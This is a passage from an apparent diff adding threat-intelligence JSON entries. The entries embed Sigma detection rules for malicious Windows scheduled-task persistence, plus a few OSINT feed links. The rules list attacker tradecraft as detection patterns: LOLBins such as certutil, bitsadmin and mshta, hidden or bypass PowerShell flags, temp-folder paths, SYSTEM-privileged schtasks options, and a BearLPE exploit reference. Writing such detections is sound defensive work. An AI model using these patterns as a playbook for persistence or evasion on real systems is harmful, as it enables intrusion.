+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/09/09\ndescription: Detects scheduled task creations or modification on a suspicious schedule\n  type\ndetection:\n  condition: all of selection_* and not 1 of filter_*\n  filter_privs:\n    CommandLine|contains:\n    - NT AUT\n    - ' SYSTEM'\n    - HIGHEST\n  selection_img:\n  - Image|endswith: \\schtasks.exe\n  - OriginalFileName: schtasks.exe\n  selection_time:\n    CommandLine|contains:\n    - ' ONLOGON '\n    - ' ONSTART '\n    - ' ONCE '\n    - ' ONIDLE '\nfalsepositives:\n- Legitmate processes that run at logon. Filter according to your environment\nid: 24c8392b-aa3c-46b7-a545-43f71657fe98\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-change\n- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\n- http://blog.talosintelligence.com/2022/09/lazarus-three-rats.html\nrelated:\n- id: 7a02e22e-b885-4404-b38b-1ddc7e65258a\n  type: similar\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1053.005\ntitle: Suspicious Schtasks Schedule Types\n",
+                            "sigma:id": "24c8392b-aa3c-46b7-a545-43f71657fe98",
+                            "title": "Suspicious Schtasks Schedule Types",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "c1bd5026-520b-45bd-9a79-82d38cf96c7b",
+                        "lookup_data": {
+                            "description": "Operation â€˜Harvestâ€™: A Deep Dive into a Long-term Campaign",
+                            "link": "http://www.botvrij.eu/data/feed-osint/c1bd5026-520b-45bd-9a79-82d38cf96c7b.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1633469315",
+                            "uuid": "c1bd5026-520b-45bd-9a79-82d38cf96c7b",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "43f487f0-755f-4c2a-bce7-d6d2eec2fcf8",
+                        "lookup_data": {
+                            "description": "schtasks.exe create task from user AppData\\Local\\Temp",
+                            "raw": "author: frack113\ndate: 2021/11/03\ndescription: schtasks.exe create task from user AppData\\Local\\Temp\ndetection:\n  condition: schtasks and option and not 1 of filter_*\n  filter_klite_codec:\n    CommandLine|contains|all:\n    - '/Create /TN \"klcp_update\" /XML '\n    - \\klcp_update_task.xml\n  option:\n    CommandLine|contains|all:\n    - '/Create '\n    - \\AppData\\Local\\Temp\n  schtasks:\n    Image|endswith: \\schtasks.exe\nfalsepositives:\n- Unknown\nid: 43f487f0-755f-4c2a-bce7-d6d2eec2fcf8\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/06/02\nreferences:\n- malware analyse https://www.joesandbox.com/analysis/514608/0/html#324415FF7D8324231381BAD48A052F85DF04\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1053.005\ntitle: Suspicious Add Scheduled Task From User AppData Temp\n",
+                            "sigma:id": "43f487f0-755f-4c2a-bce7-d6d2eec2fcf8",
+                            "title": "Suspicious Add Scheduled Task From User AppData Temp",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "7a02e22e-b885-4404-b38b-1ddc7e65258a",
+                        "lookup_data": {
+                            "description": "Detects scheduled task creations or modification to be run with high privileges on a suspicious schedule type",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/31\ndescription: Detects scheduled task creations or modification to be run with high\n  privileges on a suspicious schedule type\ndetection:\n  condition: all of selection_*\n  selection_img:\n  - Image|endswith: \\schtasks.exe\n  - OriginalFileName: schtasks.exe\n  selection_privs:\n    CommandLine|contains:\n    - NT AUT\n    - ' SYSTEM'\n    - HIGHEST\n  selection_time:\n    CommandLine|contains:\n    - ' ONLOGON '\n    - ' ONSTART '\n    - ' ONCE '\n    - ' ONIDLE '\nfalsepositives:\n- Some installers were seen using this method of creation unfortunately. Filter them\n  in your environment\nid: 7a02e22e-b885-4404-b38b-1ddc7e65258a\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-change\n- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\nrelated:\n- id: 24c8392b-aa3c-46b7-a545-43f71657fe98\n  type: similar\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1053.005\ntitle: Suspicious Schtasks Schedule Type With High Privileges\n",
+                            "sigma:id": "7a02e22e-b885-4404-b38b-1ddc7e65258a",
+                            "title": "Suspicious Schtasks Schedule Type With High Privileges",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "363eccc0-279a-4ccf-a3ab-24c2e63b11fb",
+                        "lookup_data": {
+                            "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code",
+                            "raw": "author: frack113\ndate: 2021/12/28\ndescription: Adversaries may abuse the Windows Task Scheduler to perform task scheduling\n  for initial or recurring execution of malicious code\ndetection:\n  condition: 1 of selection_*\n  selection_cimmethod:\n    ScriptBlockText|contains|all:\n    - Invoke-CimMethod\n    - -ClassName\n    - PS_ScheduledTask\n    - -NameSpace\n    - Root\\Microsoft\\Windows\\TaskScheduler\n  selection_cmdlet:\n    ScriptBlockText|contains:\n    - New-ScheduledTaskAction\n    - New-ScheduledTaskTrigger\n    - New-ScheduledTaskPrincipal\n    - New-ScheduledTaskSettingsSet\n    - New-ScheduledTask\n    - Register-ScheduledTask\nfalsepositives:\n- Unknown\nid: 363eccc0-279a-4ccf-a3ab-24c2e63b11fb\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1053.005/T1053.005.md#atomic-test-4---powershell-cmdlet-scheduled-task\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1053.005/T1053.005.md#atomic-test-6---wmi-invoke-cimmethod-scheduled-task\nstatus: test\ntags:\n- attack.persistence\n- attack.t1053.005\ntitle: Powershell Create Scheduled Task\n",
+                            "sigma:id": "363eccc0-279a-4ccf-a3ab-24c2e63b11fb",
+                            "title": "Powershell Create Scheduled Task",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4720b7df-40c3-48fd-bbdf-fd4b3c464f0d",
+                        "lookup_data": {
+                            "description": "Monitor the creation of a new key under 'TaskCache' when a new scheduled task is registered by a process that is not svchost.exe, which is suspicious",
+                            "raw": "author: Syed Hasan (@syedhasan009)\ndate: 2021/06/18\ndescription: Monitor the creation of a new key under 'TaskCache' when a new scheduled\n  task is registered by a process that is not svchost.exe, which is suspicious\ndetection:\n  condition: selection and not 1 of filter*\n  filter:\n    TargetObject|contains:\n    - Microsoft\\Windows\\UpdateOrchestrator\n    - Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask\\Index\n    - Microsoft\\Windows\\Flighting\\OneSettings\\RefreshCache\\Index\n  filter_dropbox_updater:\n    Image:\n    - C:\\Program Files (x86)\\Dropbox\\Update\\DropboxUpdate.exe\n    - C:\\Program Files\\Dropbox\\Update\\DropboxUpdate.exe\n  filter_explorer:\n    Image: C:\\Windows\\explorer.exe\n    TargetObject|contains: \\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\PLA\\Server\n      Manager Performance Monitor\\\n  filter_msiexec:\n    Image: C:\\Windows\\System32\\msiexec.exe\n  filter_ngen:\n    Image|endswith: \\ngen.exe\n    Image|startswith: C:\\Windows\\Microsoft.NET\\Framework\n    TargetObject|contains:\n    - \\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{B66B135D-DA06-4FC4-95F8-7458E1D10129}\n    - \\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\.NET\n      Framework\\.NET Framework NGEN\n  filter_office_click_to_run:\n    Image:\n    - C:\\Program Files\\Microsoft Office\\root\\Integration\\Integrator.exe\n    - C:\\Program Files (x86)\\Microsoft Office\\root\\Integration\\Integrator.exe\n  filter_svchost:\n    Image: C:\\WINDOWS\\system32\\svchost.exe\n  filter_system:\n    Image: System\n  filter_tiworker:\n    Image|endswith: \\TiWorker.exe\n    Image|startswith: C:\\Windows\\\n  selection:\n    EventType: SetValue\n    TargetObject|contains: SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\\nfalsepositives:\n- Unknown\nid: 4720b7df-40c3-48fd-bbdf-fd4b3c464f0d\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/10/21\nreferences:\n- https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/\n- https://labs.f-secure.com/blog/scheduled-task-tampering/\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1053\n- attack.t1053.005\ntitle: Scheduled TaskCache Change by Uncommon Program\n",
+                            "sigma:id": "4720b7df-40c3-48fd-bbdf-fd4b3c464f0d",
+                            "title": "Scheduled TaskCache Change by Uncommon Program",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "958d81aa-8566-4cea-a565-59ccd4df27b0",
+                        "lookup_data": {
+                            "description": "Detects the deactivation and disabling of the Scheduled defragmentation task as seen by Slingshot APT group",
+                            "raw": "author: Florian Roth (Nextron Systems), Bartlomiej Czyz (@bczyz1)\ndate: 2019/03/04\ndescription: Detects the deactivation and disabling of the Scheduled defragmentation\n  task as seen by Slingshot APT group\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - /delete\n    - /change\n    CommandLine|contains|all:\n    - /TN\n    - \\Microsoft\\Windows\\Defrag\\ScheduledDefrag\n    Image|endswith: \\schtasks.exe\nfalsepositives:\n- Unknown\nid: 958d81aa-8566-4cea-a565-59ccd4df27b0\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://securelist.com/apt-slingshot/84312/\nstatus: test\ntags:\n- attack.persistence\n- attack.t1053.005\n- attack.s0111\ntitle: Defrag Deactivation\n",
+                            "sigma:id": "958d81aa-8566-4cea-a565-59ccd4df27b0",
+                            "title": "Defrag Deactivation",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "424273ea-7cf8-43a6-b712-375f925e481f",
+                        "lookup_data": {
+                            "description": "Detects the execution of Scheduled Tasks where the Program being run is located in a suspicious location or it's an unusale program to be run from a Scheduled Task",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/12/05\ndescription: Detects the execution of Scheduled Tasks where the Program being run\n  is located in a suspicious location or it's an unusale program to be run from a\n  Scheduled Task\ndetection:\n  condition: selection\n  selection:\n    EventID: 129\n    Path|contains:\n    - C:\\Windows\\Temp\\\n    - \\AppData\\Local\\Temp\\\n    - \\Desktop\\\n    - \\Downloads\\\n    - \\Users\\Public\\\n    - C:\\Temp\\\n    - C:\\Windows\\System32\\calc.exe\n    - C:\\Windows\\System32\\regsvr32.exe\n    - C:\\Windows\\System32\\rundll32.exe\nfalsepositives:\n- Unknown\nid: 424273ea-7cf8-43a6-b712-375f925e481f\nlevel: medium\nlogsource:\n  definition: 'Requirements: The \"Microsoft-Windows-TaskScheduler/Operational\" is\n    disabled by default and needs to be enabled in order for this detection to trigger'\n  product: windows\n  service: taskscheduler\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1053.005\ntitle: Suspicious Scheduled Tasks Locations\n",
+                            "sigma:id": "424273ea-7cf8-43a6-b712-375f925e481f",
+                            "title": "Suspicious Scheduled Tasks Locations",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "73a883d0-0348-4be4-a8d8-51031c2564f8",
+                        "lookup_data": {
+                            "description": "Detects potential persistence behaviour using the windows telemetry registry key.\nWindows telemetry makes use of the binary CompatTelRunner.exe to run a variety of commands and perform the actual telemetry collections.\nThis binary was created to be easily extensible, and to that end, it relies on the registry to instruct on which commands to run.\nThe problem is, it will run any arbitrary command without restriction of location or type.\n",
+                            "raw": "author: Lednyov Alexey, oscd.community, Sreeman\ndate: 2020/10/16\ndescription: 'Detects potential persistence behaviour using the windows telemetry\n  registry key.\n\n  Windows telemetry makes use of the binary CompatTelRunner.exe to run a variety of\n  commands and perform the actual telemetry collections.\n\n  This binary was created to be easily extensible, and to that end, it relies on the\n  registry to instruct on which commands to run.\n\n  The problem is, it will run any arbitrary command without restriction of location\n  or type.\n\n  '\ndetection:\n  condition: selection and not filter\n  filter:\n    Details|contains:\n    - \\system32\\CompatTelRunner.exe\n    - \\system32\\DeviceCensus.exe\n  selection:\n    Details|contains:\n    - .sh\n    - .exe\n    - .dll\n    - .bin\n    - .bat\n    - .cmd\n    - .js\n    - .ps\n    - .vb\n    - .jar\n    - .hta\n    - .msi\n    - .vbs\n    EventType: SetValue\n    TargetObject|contains: \\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\\n    TargetObject|endswith: \\Command\nfalsepositives:\n- Unknown\nid: 73a883d0-0348-4be4-a8d8-51031c2564f8\nlevel: high\nlogsource:\n  category: registry_set\n  definition: 'Requirements: Sysmon config that monitors \\SOFTWARE\\Microsoft\\Windows\n    NT\\CurrentVersion\\AppCompatFlags\\TelemetryController subkey of the HKLM hives'\n  product: windows\nmodified: 2022/12/19\nreferences:\n- https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/\nrelated:\n- id: 4e8d5fd3-c959-441f-a941-f73d0cdcdca5\n  type: obsoletes\nstatus: test\ntags:\n- attack.persistence\n- attack.t1053.005\ntitle: Potential Registry Persistence Attempt Via Windows Telemetry\n",
+                            "sigma:id": "73a883d0-0348-4be4-a8d8-51031c2564f8",
+                            "title": "Potential Registry Persistence Attempt Via Windows Telemetry",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "89ca78fd-b37c-4310-b3d3-81a023f83936",
+                        "lookup_data": {
+                            "description": "Detects the creation or update of a scheduled task to run with \"NT AUTHORITY\\SYSTEM\" privileges",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/07/28\ndescription: Detects the creation or update of a scheduled task to run with \"NT AUTHORITY\\SYSTEM\"\n  privileges\ndetection:\n  condition: all of selection_* and not filter\n  filter:\n    CommandLine|contains: /TN TVInstallRestore\n    Image|endswith: \\schtasks.exe\n    ParentImage|contains|all:\n    - \\AppData\\Local\\Temp\\\n    - TeamViewer_.exe\n  selection_root:\n    CommandLine|contains:\n    - ' /change '\n    - ' /create '\n    Image|endswith: \\schtasks.exe\n  selection_run:\n    CommandLine|contains: '/ru '\n  selection_user:\n    CommandLine|contains:\n    - NT AUT\n    - ' SYSTEM '\nfalsepositives:\n- Unknown\nid: 89ca78fd-b37c-4310-b3d3-81a023f83936\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://www.elastic.co/security-labs/exploring-the-qbot-attack-pattern\n- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks\nstatus: experimental\ntags:\n- attack.execution\n- attack.persistence\n- attack.t1053.005\ntitle: Schtasks Creation Or Modification With SYSTEM Privileges\n",
+                            "sigma:id": "89ca78fd-b37c-4310-b3d3-81a023f83936",
+                            "title": "Schtasks Creation Or Modification With SYSTEM Privileges",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "931b6802-d6a6-4267-9ffa-526f57f22aaf",
+                        "lookup_data": {
+                            "description": "Detects potential exploitation of the BearLPE exploit using Task Scheduler \".job\" import arbitrary DACL write\\par",
+                            "raw": "author: Olaf Hartong\ndate: 2019/05/22\ndescription: Detects potential exploitation of the BearLPE exploit using Task Scheduler\n  \".job\" import arbitrary DACL write\\par\ndetection:\n  condition: all of selection*\n  selection_cli:\n    CommandLine|contains|all:\n    - /change\n    - /TN\n    - /RU\n    - /RP\n  selection_img:\n  - Image|endswith: \\schtasks.exe\n  - OriginalFileName: schtasks.exe\nfalsepositives:\n- Unknown\nid: 931b6802-d6a6-4267-9ffa-526f57f22aaf\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/26\nreferences:\n- https://github.com/djhohnstein/polarbearrepo/blob/f26d3e008093cc5c835e92a7165170baf6713d43/bearlpe/polarbear/polarbear/exploit.cpp\nstatus: test\ntags:\n- attack.privilege_escalation\n- attack.t1053.005\n- car.2013-08-001\ntitle: Potential BearLPE Exploitation\n",
+                            "sigma:id": "931b6802-d6a6-4267-9ffa-526f57f22aaf",
+                            "title": "Potential BearLPE Exploitation",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "9494479d-d994-40bf-a8b1-eea890237021",
+                        "lookup_data": {
+                            "description": "Detects suspicious scheduled task creations from a parent stored in a temporary folder",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/02/23\ndescription: Detects suspicious scheduled task creations from a parent stored in a\n  temporary folder\ndetection:\n  condition: selection and not 1 of filter*\n  filter:\n    CommandLine|contains:\n    - update_task.xml\n    - unattended.ini\n  selection:\n    CommandLine|contains: '/Create '\n    Image|endswith: \\schtasks.exe\n    ParentImage|contains:\n    - \\AppData\\Local\\\n    - \\AppData\\Roaming\\\n    - \\Temporary Internet\n    - \\Users\\Public\\\nfalsepositives:\n- Software installers that run from temporary folders and also install scheduled tasks\nid: 9494479d-d994-40bf-a8b1-eea890237021\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/06/02\nreferences:\n- https://app.any.run/tasks/649e7b46-9bec-4d05-98a5-dfa9a13eaae5/\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1053.005\ntitle: Suspicious Add Scheduled Task Parent\n",
+                            "sigma:id": "9494479d-d994-40bf-a8b1-eea890237021",
+                            "title": "Suspicious Add Scheduled Task Parent",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b20f6158-9438-41be-83da-a5a16ac90c2b",
+                        "lookup_data": {
+                            "description": "This rule detects rare scheduled task creations. Typically software gets installed on multiple systems and not only on a few. The aggregation and count function selects tasks with rare names.",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/03/17\ndescription: This rule detects rare scheduled task creations. Typically software gets\n  installed on multiple systems and not only on a few. The aggregation and count function\n  selects tasks with rare names.\ndetection:\n  condition: selection and not 1 of filter* | count() by TaskName < 5\n  filter1:\n    TaskName: \\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\n  selection:\n    EventID: 106\n  timeframe: 7d\nfalsepositives:\n- Software installation\nid: b20f6158-9438-41be-83da-a5a16ac90c2b\nlevel: low\nlogsource:\n  definition: the \"Microsoft-Windows-TaskScheduler/Operational\" is disabled by default\n    and should be enabled in order for this detection to work\n  product: windows\n  service: taskscheduler\nmodified: 2021/12/28\nstatus: test\ntags:\n- attack.persistence\n- attack.s0111\n- attack.t1053.005\ntitle: Rare Scheduled Task Creations\n",
+                            "sigma:id": "b20f6158-9438-41be-83da-a5a16ac90c2b",
+                            "title": "Rare Scheduled Task Creations",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "e1118a8f-82f5-44b3-bb6b-8a284e5df602",
+                        "lookup_data": {
+                            "description": "Detects specific process parameters as used by ACTINIUM scheduled task persistence creation.",
+                            "raw": "author: Andreas Hunkeler (@Karneades)\ndate: 2022/02/07\ndescription: Detects specific process parameters as used by ACTINIUM scheduled task\n  persistence creation.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - schtasks\n    - create\n    - wscript\n    - e:vbscript\nfalsepositives:\n- Unlikely\nfields:\n- CommandLine\n- ParentCommandLine\nid: e1118a8f-82f5-44b3-bb6b-8a284e5df602\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://www.microsoft.com/security/blog/2022/02/04/actinium-targets-ukrainian-organizations\nstatus: test\ntags:\n- attack.persistence\n- attack.t1053\n- attack.t1053.005\ntitle: Scheduled Task WScript VBScript\n",
+                            "sigma:id": "e1118a8f-82f5-44b3-bb6b-8a284e5df602",
+                            "title": "Scheduled Task WScript VBScript",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f35d4a9f-881b-46b7-9d8a-887a40bce133",
+                        "lookup_data": {
+                            "description": "The SideWalk may be as dangerous as the CROSSWALK",
+                            "link": "http://www.botvrij.eu/data/feed-osint/f35d4a9f-881b-46b7-9d8a-887a40bce133.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1630180802",
+                            "uuid": "f35d4a9f-881b-46b7-9d8a-887a40bce133",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "ff2fff64-4cd6-4a2b-ba7d-e28a30bbe66b",
+                        "lookup_data": {
+                            "description": "Detects creation of a scheduled task with a GUID like name",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/10/31\ndescription: Detects creation of a scheduled task with a GUID like name\ndetection:\n  condition: all of selection_*\n  selection_end:\n    CommandLine|contains:\n    - '}\"'\n    - '}'''\n    - '} '\n  selection_img:\n    CommandLine|contains: '/Create '\n    Image|endswith: \\schtasks.exe\n  selection_tn:\n    CommandLine|contains:\n    - /TN \"{\n    - /TN '{\n    - /TN {\nfalsepositives:\n- Legitimate software naming their tasks as GUIDs\nid: ff2fff64-4cd6-4a2b-ba7d-e28a30bbe66b\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://thedfirreport.com/2022/10/31/follina-exploit-leads-to-domain-compromise/\n- https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1053.005\ntitle: Suspicious Scheduled Task Name As GUID\n",
+                            "sigma:id": "ff2fff64-4cd6-4a2b-ba7d-e28a30bbe66b",
+                            "title": "Suspicious Scheduled Task Name As GUID",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "92626ddd-662c-49e3-ac59-f6535f12d189",
+                        "lookup_data": {
+                            "description": "Detects the creation of scheduled tasks in user session",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/01/16\ndescription: Detects the creation of scheduled tasks in user session\ndetection:\n  condition: selection and not filter\n  filter:\n    User|contains:\n    - AUTHORI\n    - AUTORI\n  selection:\n    CommandLine|contains: ' /create '\n    Image|endswith: \\schtasks.exe\nfalsepositives:\n- Administrative activity\n- Software installation\nfields:\n- CommandLine\n- ParentCommandLine\nid: 92626ddd-662c-49e3-ac59-f6535f12d189\nlevel: low\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nstatus: test\ntags:\n- attack.execution\n- attack.persistence\n- attack.privilege_escalation\n- attack.t1053.005\n- attack.s0111\n- car.2013-08-001\ntitle: Scheduled Task Creation\n",
+                            "sigma:id": "92626ddd-662c-49e3-ac59-f6535f12d189",
+                            "title": "Scheduled Task Creation",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "614cf376-6651-47c4-9dcc-6b9527f749f4",
+                        "lookup_data": {
+                            "description": "Detects update to a scheduled task event that contain suspicious keywords.",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/12/05\ndescription: Detects update to a scheduled task event that contain suspicious keywords.\ndetection:\n  condition: all of selection_*\n  selection_commands:\n    TaskContentNew|contains:\n    - regsvr32\n    - rundll32\n    - cmd.exe</Command>\n    - cmd</Command>\n    - '<Arguments>/c '\n    - '<Arguments>/k '\n    - '<Arguments>/r '\n    - powershell\n    - pwsh\n    - mshta\n    - wscript\n    - cscript\n    - certutil\n    - bitsadmin\n    - bash.exe\n    - 'bash '\n    - scrcons\n    - 'wmic '\n    - wmic.exe\n    - forfiles\n    - scriptrunner\n    - hh.exe\n  selection_eid:\n    EventID: 4702\n  selection_paths:\n    TaskContentNew|contains:\n    - \\AppData\\Local\\Temp\\\n    - \\AppData\\Roaming\\\n    - \\Users\\Public\\\n    - \\WINDOWS\\Temp\\\n    - C:\\Temp\\\n    - \\Desktop\\\n    - \\Downloads\\\n    - \\Temporary Internet\n    - C:\\ProgramData\\\n    - C:\\Perflogs\\\nfalsepositives:\n- Unknown\nid: 614cf376-6651-47c4-9dcc-6b9527f749f4\nlevel: high\nlogsource:\n  definition: The Advanced Audit Policy setting Object Access > Audit Other Object\n    Access Events has to be configured to allow this detection. We also recommend\n    extracting the Command field from the embedded XML in the event data.\n  product: windows\n  service: security\nreferences:\n- https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4698\nstatus: experimental\ntags:\n- attack.execution\n- attack.privilege_escalation\n- attack.persistence\n- attack.t1053.005\ntitle: Suspicious Scheduled Task Update\n",
+                            "sigma:id": "614cf376-6651-47c4-9dcc-6b9527f749f4",
+                            "title": "Suspicious Scheduled Task Update",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "74ad4314-482e-4c3e-b237-3f7ed3b9ca8d",
+                        "lookup_data": {
+                            "description": "Detects activity mentioned in Operation Wocao report",
+                            "raw": "author: Florian Roth (Nextron Systems), frack113\ndate: 2019/12/20\ndescription: Detects activity mentioned in Operation Wocao report\ndetection:\n  condition: selection\n  selection:\n    CallerProcessName|endswith: \\checkadmin.exe\n    EventID: 4799\n    TargetUserName|startswith: Administr\nfalsepositives:\n- Administrators that use checkadmin.exe tool to enumerate local administrators\nid: 74ad4314-482e-4c3e-b237-3f7ed3b9ca8d\nlevel: high\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/11/27\nreferences:\n- https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/\n- https://twitter.com/SBousseaden/status/1207671369963646976\nstatus: test\ntags:\n- attack.discovery\n- attack.t1012\n- attack.defense_evasion\n- attack.t1036.004\n- attack.t1027\n- attack.execution\n- attack.t1053.005\n- attack.t1059.001\ntitle: Operation Wocao Activity - Security\n",
+                            "sigma:id": "74ad4314-482e-4c3e-b237-3f7ed3b9ca8d",
+                            "title": "Operation Wocao Activity - Security",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b66474aa-bd92-4333-a16c-298155b120df",
+                        "lookup_data": {
+                            "description": "Detects suspicious powershell execution that ends with a common flag instead of a command or a filename to execute (could be a sign of implicit execution that uses files in WindowsApps directory)",
+                            "raw": "author: pH-T (Nextron Systems), Florian Roth\ndate: 2022/04/08\ndescription: Detects suspicious powershell execution that ends with a common flag\n  instead of a command or a filename to execute (could be a sign of implicit execution\n  that uses files in WindowsApps directory)\ndetection:\n  condition: selection\n  selection:\n    CommandLine|endswith:\n    - ' -windowstyle hidden\"'\n    - ' -windowstyle hidden'\n    - ' -windowstyle hidden'''\n    - ' -w hidden\"'\n    - ' -w hidden'\n    - ' -w hidden'''\n    - ' -ep bypass\"'\n    - ' -ep bypass'\n    - ' -ep bypass'''\n    - ' -noni\"'\n    - ' -noni'\n    - ' -noni'''\nfalsepositives:\n- Unknown\nid: b66474aa-bd92-4333-a16c-298155b120df\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-persistence-technique/\nstatus: experimental\ntags:\n- attack.execution\n- attack.persistence\n- attack.t1053.005\n- attack.t1059.001\ntitle: Suspicious Powershell No File or Command\n",
+                            "sigma:id": "b66474aa-bd92-4333-a16c-298155b120df",
+                            "title": "Suspicious Powershell No File or Command",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "39019a4e-317f-4ce3-ae63-309a8c6b53c5",
+                        "lookup_data": {
+                            "description": "Detects the creation of scheduled tasks that involves a temporary folder and runs only once",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/03/11\ndescription: Detects the creation of scheduled tasks that involves a temporary folder\n  and runs only once\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - ' /create '\n    - ' /sc once '\n    - \\Temp\\\n    Image|endswith: \\schtasks.exe\nfalsepositives:\n- Administrative activity\n- Software installation\nfields:\n- CommandLine\n- ParentCommandLine\nid: 39019a4e-317f-4ce3-ae63-309a8c6b53c5\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://discuss.elastic.co/t/detection-and-response-for-hafnium-activity/266289/3\nstatus: test\ntags:\n- attack.execution\n- attack.persistence\n- attack.t1053.005\ntitle: Suspicious Scheduled Task Creation Involving Temp Folder\n",
+                            "sigma:id": "39019a4e-317f-4ce3-ae63-309a8c6b53c5",
+                            "title": "Suspicious Scheduled Task Creation Involving Temp Folder",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "53ba33fd-3a50-4468-a5ef-c583635cfa92",
+                        "lookup_data": {
+                            "description": "Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018",
